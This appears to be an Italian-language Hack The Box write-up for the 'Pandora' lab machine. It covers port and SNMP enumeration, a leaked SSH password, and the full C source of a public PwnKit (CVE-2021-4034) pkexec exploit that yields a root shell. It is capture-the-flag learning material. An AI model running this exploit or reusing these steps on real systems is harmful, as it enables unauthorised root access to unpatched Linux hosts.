<!doctype html>
<html lang="en">
<head>
<title>HTB - Pandora</title>
<!-- 2022-04-23 sab 01:55 -->
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="generator" content="Org-mode">
<meta name="author" content="Andrea Pepe">

<link  href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.5/js/bootstrap.min.js"></script>
<style>
/* org mode styles on top of twbs */

html {
    position: relative;
    min-height: 100%;
}

body {
    font-size: 18px;
    margin-bottom: 105px;
}

footer {
    position: absolute;
    bottom: 0;
    width: 100%;
    height: 101px;
    background-color: #f5f5f5;
}

footer > div {
    padding: 10px;
}

footer p {
    margin: 0 0 5px;
    text-align: center;
    font-size: 16px;
}

#table-of-contents {
    margin-top: 20px;
    margin-bottom: 20px;
}

blockquote p {
    font-size: 18px;
}

pre {
    font-size: 16px;
}

.footpara {
    display: inline-block;
}

figcaption {
  font-size: 16px;
  color: #666;
  font-style: italic;
  padding-bottom: 15px;
}

/* from twbs docs */

.bs-docs-sidebar.affix {
    position: static;
}
@media (min-width: 768px) {
    .bs-docs-sidebar {
        padding-left: 20px;
    }
}

/* All levels of nav */
.bs-docs-sidebar .nav > li > a {
    display: block;
    padding: 4px 20px;
    font-size: 14px;
    font-weight: 500;
    color: #999;
}
.bs-docs-sidebar .nav > li > a:hover,
.bs-docs-sidebar .nav > li > a:focus {
    padding-left: 19px;
    color: #A1283B;
    text-decoration: none;
    background-color: transparent;
    border-left: 1px solid #A1283B;
}
.bs-docs-sidebar .nav > .active > a,
.bs-docs-sidebar .nav > .active:hover > a,
.bs-docs-sidebar .nav > .active:focus > a {
    padding-left: 18px;
    font-weight: bold;
    color: #A1283B;
    background-color: transparent;
    border-left: 2px solid #A1283B;
}

/* Nav: second level (shown on .active) */
.bs-docs-sidebar .nav .nav {
    display: none; /* Hide by default, but at >768px, show it */
    padding-bottom: 10px;
}
.bs-docs-sidebar .nav .nav > li > a {
    padding-top: 1px;
    padding-bottom: 1px;
    padding-left: 30px;
    font-size: 12px;
    font-weight: normal;
}
.bs-docs-sidebar .nav .nav > li > a:hover,
.bs-docs-sidebar .nav .nav > li > a:focus {
    padding-left: 29px;
}
.bs-docs-sidebar .nav .nav > .active > a,
.bs-docs-sidebar .nav .nav > .active:hover > a,
.bs-docs-sidebar .nav .nav > .active:focus > a {
    padding-left: 28px;
    font-weight: 500;
}

/* Nav: third level (shown on .active) */
.bs-docs-sidebar .nav .nav .nav {
    padding-bottom: 10px;
}
.bs-docs-sidebar .nav .nav .nav > li > a {
    padding-top: 1px;
    padding-bottom: 1px;
    padding-left: 40px;
    font-size: 12px;
    font-weight: normal;
}
.bs-docs-sidebar .nav .nav .nav > li > a:hover,
.bs-docs-sidebar .nav .nav .nav > li > a:focus {
    padding-left: 39px;
}
.bs-docs-sidebar .nav .nav .nav > .active > a,
.bs-docs-sidebar .nav .nav .nav > .active:hover > a,
.bs-docs-sidebar .nav .nav .nav > .active:focus > a {
    padding-left: 38px;
    font-weight: 500;
}

/* Show and affix the side nav when space allows it */
@media (min-width: 992px) {
    .bs-docs-sidebar .nav > .active > ul {
        display: block;
    }
    /* Widen the fixed sidebar */
    .bs-docs-sidebar.affix,
    .bs-docs-sidebar.affix-bottom {
        width: 213px;
    }
    .bs-docs-sidebar.affix {
        position: fixed; /* Undo the static from mobile first approach */
        top: 20px;
    }
    .bs-docs-sidebar.affix-bottom {
        position: absolute; /* Undo the static from mobile first approach */
    }
    .bs-docs-sidebar.affix .bs-docs-sidenav,.bs-docs-sidebar.affix-bottom .bs-docs-sidenav {
        margin-top: 0;
        margin-bottom: 0
    }
}
@media (min-width: 1200px) {
    /* Widen the fixed sidebar again */
    .bs-docs-sidebar.affix-bottom,
    .bs-docs-sidebar.affix {
        width: 263px;
    }
}
</style>
<script>
$(function() {
    'use strict';

    $('.bs-docs-sidebar li').first().addClass('active');

    $(document.body).scrollspy({target: '.bs-docs-sidebar'});

    $('.bs-docs-sidebar').affix();
});
</script>
</head>
<body>
<div id="content" class="container">
<div class="row"><div class="col-md-12"><h1 class="title">HTB - Pandora</h1>

<div id="outline-container-sec-" class="outline-2">
<h2 id="sec-">Enumeration</h2>
<div class="outline-text-2" id="text-">
</div><div id="outline-container-sec-" class="outline-3">
<h3 id="sec-">nmap</h3>
<div class="outline-text-3" id="text-">
</div><div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">$ sudo nmap -sV -sC pandora</h4>
<div class="outline-text-4" id="text-">
<pre class="example">
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-22 19:33 CEST
Nmap scan report for pandora (10.10.11.136)
Host is up (0.064s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.52 seconds
</pre>
</div>

<ul class="org-ul"><li><a id="sec-" name="sec-"></a>$ searchsploit Apache 2.4.41<br ><div class="outline-text-5" id="text-">
<pre class="example">
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - cgi-bin Remote Code Execution                                                     | php/remote/29290.c
Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - Remote Code Execution + Scanner                                                   | php/remote/29316.py
Apache CXF &lt; 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                 | multiple/dos/26710.txt
Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                | unix/remote/21671.c
Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                          | unix/remote/764.c
Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                          | unix/remote/47080.c
Apache OpenMeetings 1.9.x &lt; 3.1.0 - '.ZIP' File Directory Traversal                                                 | linux/webapps/39642.txt
Apache Tomcat &lt; 5.5.17 - Remote Directory Listing                                                                   | multiple/remote/2061.txt
Apache Tomcat &lt; 6.0.18 - 'utf8' Directory Traversal                                                                 | unix/remote/14489.c
Apache Tomcat &lt; 6.0.18 - 'utf8' Directory Traversal (PoC)                                                           | multiple/remote/6229.txt
Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)        | windows/webapps/42953.txt
Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)        | jsp/webapps/42966.py
Apache Xerces-C XML Parser &lt; 3.1.2 - Denial of Service (PoC)                                                        | linux/dos/36906.txt
Webfroot Shoutbox &lt; 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                    | linux/remote/34.pl
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

</pre>
</div>
</li></ul>
</div>

<div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">$ sudo nmap -p- pandora</h4>
<div class="outline-text-4" id="text-">
<pre class="example">
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-22 19:34 CEST
Nmap scan report for pandora (10.10.11.136)
Host is up (0.090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 22.58 seconds    
</pre>
</div>
</div>
</div>
</div>



<div id="outline-container-sec-" class="outline-2">
<h2 id="sec-">Web Server</h2>
<div class="outline-text-2" id="text-">
</div><div id="outline-container-sec-" class="outline-3">
<h3 id="sec-">vhost</h3>
<div class="outline-text-3" id="text-">
<p>
Accedendo ad <a href="http://pandora">http://pandora</a>, saltano subito
all'occhio due sentences che ci portano a pensare all'esistenza di virtual hosts:
</p>

<pre class="example">
PLAY is an extention of Panda.HTB, bringing network monitoring solutions to your doorstep.
</pre>

<pre class="example">
Working together with Panda.HTB we provide delivery, installation and usage on network monitoring applications.
</pre>

<pre class="example">
support@panda.htb
contact@panda.htb
</pre>
</div>
<div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">gobuster</h4>
<div class="outline-text-4" id="text-">
<pre class="example">
$ sudo gobuster vhost -u http://pandora -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt            
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://pandora
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/04/22 19:49:50 Starting gobuster in VHOST enumeration mode
===============================================================
Found: '.pandora (Status: 400) [Size: 301]
Found: %20.pandora (Status: 400) [Size: 301]
Found: $FILE.pandora (Status: 400) [Size: 301]
Found: $file.pandora (Status: 400) [Size: 301]
Found: *checkout*.pandora (Status: 400) [Size: 301]
Found: *docroot*.pandora (Status: 400) [Size: 301] 
Found: *.pandora (Status: 400) [Size: 301]         
Found: $File.pandora (Status: 400) [Size: 301]     
Found: !ut.pandora (Status: 400) [Size: 301]       
Found: search!default.pandora (Status: 400) [Size: 301]	
Found: msgReader$1.pandora (Status: 400) [Size: 301]   
Found: 4%20Color%2099%20IT2.pandora (Status: 400) [Size: 301]
Found: %7Emike.pandora (Status: 400) [Size: 301]             
Found: http%3A%2F%2Fwww.pandora (Status: 400) [Size: 301]    
Found: guestsettings!default.pandora (Status: 400) [Size: 301]
Found: login!withRedirect.pandora (Status: 400) [Size: 301]   
Found: $1.pandora (Status: 400) [Size: 301]                   
Found: front_page!PAGETYPE.pandora (Status: 400) [Size: 301]  
Found: http%3A.pandora (Status: 400) [Size: 301]              
Found: MSNBC%20Interactive.pandora (Status: 400) [Size: 301]  
Found: Picture%201.pandora (Status: 400) [Size: 301]          
Found: 3 Popular Music Videos.pandora (Status: 400) [Size: 301]
Found: Espa%c3%b1ol.pandora (Status: 400) [Size: 301]          
Found: Fran%c3%a7ais.pandora (Status: 400) [Size: 301]         
Found: Privacy%20Policy.pandora (Status: 400) [Size: 301]      
Found: q%26a.pandora (Status: 400) [Size: 301]                 
Found: **http%3a.pandora (Status: 400) [Size: 301]             
Found: MSNBC10%20section%20front%20headers.pandora (Status: 400) [Size: 301]
Found: searchProfile!input.pandora (Status: 400) [Size: 301]                
Found: Who's-Connecting.pandora (Status: 400) [Size: 301]                   
Found: %7Ejeff.pandora (Status: 400) [Size: 301]                            
Found: *http%3A.pandora (Status: 400) [Size: 301]
</pre>
</div>
</div>

<div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">panda.htb</h4>
<div class="outline-text-4" id="text-">
<p>
Gobuster sembra non essere attendibile, ma
proviamo a inserire a mano il virtual host
<code>panda.htb</code> in <code>/etc/hosts</code> e ad effettuare una ricerca.
</p>

<p>
Il dominio presenta la stessa pagina web del precedente.
Proviamo a farne una enumerazione di directory e vhosts. 
</p>
</div>
<ul class="org-ul"><li><a id="sec-" name="sec-"></a>$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <a href="http://panda.htb">http://panda.htb</a> -x html,txt<br ><div class="outline-text-5" id="text-">
<pre class="example">
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://panda.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html
[+] Timeout:                 10s
===============================================================
2022/04/22 20:04:25 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 33560]
/assets               (Status: 301) [Size: 307] [--&gt; http://panda.htb/assets/]
Progress: 95133 / 661683 (14.38%)
</pre>

<p>
Non sembra essere una strada promettente.
</p>
</div>
</li></ul>
</div>
</div>
</div>


<div id="outline-container-sec-" class="outline-2">
<h2 id="sec-">UDP port scanning</h2>
<div class="outline-text-2" id="text-">
</div><div id="outline-container-sec-" class="outline-3">
<h3 id="sec-">nmap</h3>
<div class="outline-text-3" id="text-">
</div><div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">$ sudo nmap -sU pandora</h4>
<div class="outline-text-4" id="text-">
<pre class="example">
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-22 20:13 CEST
Nmap scan report for pandora (10.10.11.136)
Host is up (0.068s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 1083.31 seconds
</pre>
<p>
Notiamo che è aperta la porta <code>UDP/161</code> con il servizio <code>snmp</code>.
</p>
</div>
</div>

<div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">$ sudo nmap -sU -sV -p161 pandora</h4>
<div class="outline-text-4" id="text-">
<pre class="example">
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-22 22:31 CEST
Nmap scan report for pandora (10.10.11.136)
Host is up (0.053s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
</pre>
</div>
</div>
</div>
</div>


<div id="outline-container-sec-" class="outline-2">
<h2 id="sec-">snmp</h2>
<div class="outline-text-2" id="text-">
</div><div id="outline-container-sec-" class="outline-3">
<h3 id="sec-">$ snmpwalk -v 1 -c public 10.10.11.136 &gt; snmpwalk.txt</h3>
<div class="outline-text-3" id="text-">
<pre class="example">
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (2008109) 5:34:41.09
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (5) 0:00:00.05
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1

...

</pre>

<p>
Vediamo che c'è "Daniel", che è un buon candidato per essere uno username.
Analizziamo più a fondo l'enorme output greppando per <b>daniel</b>.
</p>
</div>
</div>

<div id="outline-container-sec-" class="outline-3">
<h3 id="sec-">$ grep -i daniel snmpwalk.txt</h3>
<div class="outline-text-3" id="text-">
<pre class="example">
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.25.4.2.1.5.814 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.1117 = STRING: "-u daniel -p HotelBabylon23"
</pre>

<p>
Super interessante sembra essere l'ultima riga di output, che sembra contenere una password:
<code>daniel:HotelBabylon23</code>
</p>

<p>
Proviamo ad usarla per connetterci tramite <b>ssh</b>.
</p>
</div>
</div>

<div id="outline-container-sec-" class="outline-3">
<h3 id="sec-">ssh</h3>
<div class="outline-text-3" id="text-">
<pre class="example">
$ ssh daniel@pandora
daniel@pandora's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 22 Apr 22:12:14 UTC 2022

  System load:  0.02              Processes:             247
  Usage of /:   64.8% of 4.87GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for eth0: 10.10.11.136
  Swap usage:   0%

  =&gt; /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Apr 22 22:11:06 2022 from 10.10.16.41
daniel@pandora:~$ 
</pre>

<p>
And YESSS!!! We're in!
</p>
</div>
</div>
</div>


<div id="outline-container-sec-" class="outline-2">
<h2 id="sec-">Privilege Escalation</h2>
<div class="outline-text-2" id="text-">
</div><div id="outline-container-sec-" class="outline-3">
<h3 id="sec-">daniel</h3>
<div class="outline-text-3" id="text-">
</div><div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">daniel@pandora:~$ sudo -l</h4>
<div class="outline-text-4" id="text-">
<pre class="example">
[sudo] password for daniel: 
Sorry, user daniel may not run sudo on pandora.   
</pre>
</div>
</div>


<div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">home/matt</h4>
<div class="outline-text-4" id="text-">
<p>
Notiamo che daniel non ha il file <code>user.txt</code>, quindi deve esserci un altro utente.
</p>
<pre class="example">
daniel@pandora:~$ cd ..

daniel@pandora:/home$ ls -lha
total 16K
drwxr-xr-x  4 root   root   4.0K Dec  7 14:32 .
drwxr-xr-x 18 root   root   4.0K Dec  7 14:32 ..
drwxr-xr-x  5 daniel daniel 4.0K Apr 22 19:00 daniel
drwxr-xr-x  3 matt   matt   4.0K Apr 22 18:21 matt
</pre>
</div>
</div>
<div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">mysql</h4>
<div class="outline-text-4" id="text-">
<p>
Provando la password <code>HotelBabylon23</code> non si riesce ad accedere al db con nessuno dei due utenti
</p>
</div>
</div>
</div>

<div id="outline-container-sec-" class="outline-3">
<h3 id="sec-">linpeas</h3>
<div class="outline-text-3" id="text-">
<p>
Caricando <b>linpeas.sh</b> sulla macchina tramite <b>curl</b>, lo si esegue e il sistema risulta essere vulnerabile alla <b>CVE-2021-4034</b>.
La vulnerabilità riguarda l'utility <code>pkexec</code> di <code>polkit</code>.
</p>
<pre class="example">
daniel@pandora:~$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |
    |---------------------------------------------------------------------------| 
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter   :     @carlospolopm                           |
    |         Respect on HTB      :     SirBroccoli                             |
    |---------------------------------------------------------------------------|
    |                                 Thank you!                                |
    \---------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console &amp; mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
OS: Linux version 5.4.0-91-generic (buildd@lcy01-amd64-017) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021
User &amp; Groups: uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
Hostname: pandora
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover &amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h)
[+] nmap is available for network discover &amp; port scanning, you should use it yourself


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
                                        ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 5.4.0-91-generic (buildd@lcy01-amd64-017) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.3 LTS
Release:	20.04
Codename:	focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.31

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

./linpeas.sh: 1192: [[: not found
./linpeas.sh: 1192: rpm: not found
./linpeas.sh: 1192: 0: not found
./linpeas.sh: 1202: [[: not found
</pre>

<p>
Al seguente <a href="https:cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034">link</a> è possibile trovare la seguente descrizione:
</p>
<blockquote>
<p>
A local privilege escalation vulnerability was found on polkit's pkexec utility.
The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies.
The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands.
An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code.
When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.
</p>
</blockquote>
</div>
</div>

<div id="outline-container-sec-" class="outline-3">
<h3 id="sec-">CVE-2021-4034</h3>
<div class="outline-text-3" id="text-">
<p>
Al seguente <a href="https://github.com/berdav/CVE-2021-4034">link github</a> è stato possibile trovare dei codici che exploitassero la vulnerabilità.
Tuttavia, è stato più semplice sfruttare l'exploit trovato al seguente link su <code>exploit-db</code>
<a href="https://www.exploit-db.com/exploits/50689">https://www.exploit-db.com/exploits/50689</a>.
</p>
</div>

<div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">Makefile</h4>
<div class="outline-text-4" id="text-">
<pre class="example">
all:
	gcc -shared -o evil.so -fPIC evil-so.c
	gcc exploit.c -o exploit

clean:
	rm -r ./GCONV_PATH=. &amp;&amp; rm -r ./evildir &amp;&amp; rm exploit &amp;&amp; rm evil.so
</pre>
</div>
</div>

<div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">evil-so.c</h4>
<div class="outline-text-4" id="text-">
<div class="org-src-container">

<pre class="src src-c"><span style="color: #bc6ec5;">#include</span> <span style="color: #2d9574;">&lt;stdio.h&gt;</span>
<span style="color: #bc6ec5;">#include</span> <span style="color: #2d9574;">&lt;stdlib.h&gt;</span>
<span style="color: #bc6ec5;">#include</span> <span style="color: #2d9574;">&lt;unistd.h&gt;</span>

<span style="color: #ce537a; font-weight: bold;">void</span> <span style="color: #bc6ec5; font-weight: bold;">gconv</span>() {}

<span style="color: #ce537a; font-weight: bold;">void</span> <span style="color: #bc6ec5; font-weight: bold;">gconv_init</span>() {
    setuid(0);
    setgid(0);
    setgroups(0);

    execve(<span style="color: #2d9574;">"/bin/sh"</span>, <span style="color: #a45bad;">NULL</span>, <span style="color: #a45bad;">NULL</span>);
}
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">exploit.c</h4>
<div class="outline-text-4" id="text-">
<div class="org-src-container">

<pre class="src src-c"><span style="color: #bc6ec5;">#include</span> <span style="color: #2d9574;">&lt;stdio.h&gt;</span>
<span style="color: #bc6ec5;">#include</span> <span style="color: #2d9574;">&lt;stdlib.h&gt;</span>

<span style="color: #bc6ec5;">#define</span> <span style="color: #7590db;">BIN</span> <span style="color: #2d9574;">"/usr/bin/pkexec"</span>
<span style="color: #bc6ec5;">#define</span> <span style="color: #7590db;">DIR</span> <span style="color: #2d9574;">"evildir"</span>
<span style="color: #bc6ec5;">#define</span> <span style="color: #7590db;">EVILSO</span> <span style="color: #2d9574;">"evil"</span>

<span style="color: #ce537a; font-weight: bold;">int</span> <span style="color: #bc6ec5; font-weight: bold;">main</span>()
{
    <span style="color: #ce537a; font-weight: bold;">char</span> *<span style="color: #7590db;">envp</span>[] = {
        DIR,
        <span style="color: #2d9574;">"PATH=GCONV_PATH=."</span>,
        <span style="color: #2d9574;">"SHELL=ryaagard"</span>,
        <span style="color: #2d9574;">"CHARSET=ryaagard"</span>,
        <span style="color: #a45bad;">NULL</span>
    };
    <span style="color: #ce537a; font-weight: bold;">char</span> *<span style="color: #7590db;">argv</span>[] = { <span style="color: #a45bad;">NULL</span> };

    system(<span style="color: #2d9574;">"mkdir GCONV_PATH=."</span>);
    system(<span style="color: #2d9574;">"touch GCONV_PATH=./"</span> DIR <span style="color: #2d9574;">" &amp;&amp; chmod 777 GCONV_PATH=./"</span> DIR);
    system(<span style="color: #2d9574;">"mkdir "</span> DIR);
    system(<span style="color: #2d9574;">"echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t"</span> EVILSO <span style="color: #2d9574;">"\t\t\t2' &gt; "</span> DIR <span style="color: #2d9574;">"/gconv-modules"</span>);
    system(<span style="color: #2d9574;">"cp "</span> EVILSO <span style="color: #2d9574;">".so "</span> DIR);

    execve(BIN, argv, envp);

    <span style="color: #4f97d7; font-weight: bold;">return</span> 0;
}
</pre>
</div>

<p>
Sulla macchina <code>pandora</code> non erano presenti <b>make</b> e <b>gcc</b> quindi la compilazione è avvenuta in locale e
i files compilati sono stati trasferiti sulla macchina target tramite <code>curl</code>, dopo aver runnato un server web
in locale tramite python con il comando:
</p>
<pre class="example">
python3 -m http.server 4321
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-" class="outline-3">
<h3 id="sec-">root</h3>
<div class="outline-text-3" id="text-">
<p>
Eseguendo l'exploit, si è riusciti ad ottenere una shell da root:
</p>
<pre class="example">
daniel@pandora:~$ ./exploit 
# whoami
root
</pre>

<p>
